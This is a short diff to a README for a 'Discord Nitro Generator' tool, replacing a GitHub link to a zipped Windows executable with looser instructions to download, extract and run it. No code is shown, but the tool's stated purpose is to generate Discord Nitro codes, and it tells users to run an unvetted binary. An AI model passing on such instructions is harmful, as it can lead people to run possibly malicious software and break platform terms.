@@ -17,10 +17,8 @@ python3 dng_by_gl_aria.py
 ```
 Windows:
 ```sh
-#first you need to downlowd some files
-https://github.com/gamer13alone/DNG/raw/main/DNG%20EXE%20Edition.zip
-#after donwlod you need to extract zip file
-#after extract downlowded file just open extracted folder and run DNG (Discord Nitro Generator)
+you just need to download and extract DNG EXE Edition.zip
+adn after do that just open and run the DNG (Discord Nitro Generator)
 ```
 
 ## Usage example
